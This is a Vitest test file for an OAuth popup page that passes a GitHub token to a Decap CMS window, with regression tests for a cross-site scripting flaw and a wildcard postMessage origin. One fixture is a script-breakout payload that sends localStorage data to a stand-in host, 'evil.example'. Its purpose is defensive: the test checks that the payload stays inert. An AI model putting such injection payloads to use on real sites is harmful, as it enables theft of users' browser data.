import { describe, it, expect } from "vitest";
import { buildPostMessageHtml } from "./oauth-popup-html";

describe("buildPostMessageHtml", () => {
  it("embeds a success payload in Decap's documented postMessage protocol, no secret present", () => {
    const html = buildPostMessageHtml({ status: "success", token: "gho_realtoken" }, "https://deep-portfolio.example");
    expect(html).toContain("authorization:github:success:");
    expect(html).toContain("gho_realtoken");
    expect(html).not.toContain("client_secret");
    expect(html).toContain("window.close()");
  });

  it("embeds an error payload without exposing a token", () => {
    const html = buildPostMessageHtml({ status: "error", message: "access_denied" }, "https://deep-portfolio.example");
    expect(html).toContain("authorization:github:error:");
    expect(html).toContain("access_denied");
  });

  // SEC-001 (High, CWE-79) regression test — audit-20260915-feature-04-cms.md.
  // JSON.stringify does not escape "</", so an attacker-controlled `error`
  // query-string value reaching this function could previously break out
  // of the inline <script> block and inject arbitrary script.
  it("SEC-001: does not let a malicious message value break out of the inline <script> block", () => {
    const malicious = '</script><script>window.__pwned=true;fetch("https://evil.example?t="+localStorage.getItem("x"))</script>';
    const html = buildPostMessageHtml({ status: "error", message: malicious }, "https://deep-portfolio.example");

    // No literal, unescaped "</script>" may appear anywhere except the
    // single genuine closing tag this template emits.
    const closingTagCount = (html.match(/<\/script>/g) ?? []).length;
    expect(closingTagCount).toBe(1);
    // No second <script ...> opening tag was injected either.
    const openingTagCount = (html.match(/<script[\s>]/g) ?? []).length;
    expect(openingTagCount).toBe(1);
    // The message text may still appear as inert *string data* passed to
    // postMessage, but never as a live statement the parser executes —
    // i.e. it must not appear outside the single JSON string literal.
    expect(html).toContain("postMessage(");
    const postMessageCallArg = html.split("postMessage(")[1].split(", \"https")[0];
    expect(postMessageCallArg.startsWith('"')).toBe(true);
  });

  it("still delivers the (now-inert) message text to the opener", () => {
    const html = buildPostMessageHtml({ status: "error", message: "</script>harmless" }, "https://deep-portfolio.example");
    expect(html).toContain("harmless");
  });

  // SEC-005 (Low, CWE-346) — postMessage must target a specific origin,
  // never the wildcard "*", so a non-opener listener cannot receive it.
  it("SEC-005: posts to the given targetOrigin, never a wildcard", () => {
    const html = buildPostMessageHtml(
      { status: "success", token: "gho_x" },
      "https://deep-portfolio.example",
    );
    expect(html).toContain('postMessage(');
    expect(html).toContain("deep-portfolio.example");
    expect(html).not.toMatch(/postMessage\([^)]*,\s*"\*"\s*\)/);
  });
});
